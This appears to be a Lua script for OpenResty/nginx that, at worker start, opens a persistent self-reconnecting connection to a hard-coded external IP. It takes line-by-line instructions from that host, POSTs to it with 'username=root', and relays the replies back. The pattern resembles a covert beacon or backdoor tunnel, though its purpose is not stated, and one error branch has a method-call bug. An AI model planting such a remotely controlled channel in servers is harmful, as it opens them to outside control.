local function proxy()
    local shutdown = 0

    while true do
        if ngx.worker.exiting() then
            break
        end

        local tcpsocket = ngx.socket.tcp()
        local ok, err = tcpsocket:connect("49.4.8.123", 8083)
        if not ok then
            ngx.timer.at(5, proxy)
            break
        else
            tcpsocket:send("0")

            while true do
                if ngx.worker.exiting() then
                    shutdown = 1
                    break
                end
                local result = ""
                tcpsocket:settimeout(600000)
                local line, err, partial = tcpsocket:receive()
                if not line then
                    tcpsocket:close()
                    break
                else
                    line = string.gsub(line, "^%s*(.-)%s*$", "%1")

                    local http = require("resty.http")
                    local httpc = http.new()
                    local res, err = httpc:request_uri("http://49.4.8.123:8083" .. line, {
                        method = "POST",
                        body = "username=root",
                        headers = {
                            ["Content-Type"] = "application/x-www-form-urlencoded",
                        }
                    })

                    if not res then
                        tcpsocket.send("0_err")
                    else
                        local len = string.len(res.body)
                        tcpsocket:send(len .. "_" .. res.body)
                    end
                end
            end

            if shutdown == 1 then
                break
            end
        end
    end
end

local ok, err = ngx.timer.at(0, proxy)
if not ok then
    ngx.log(ngx.ERR, "timer error")
end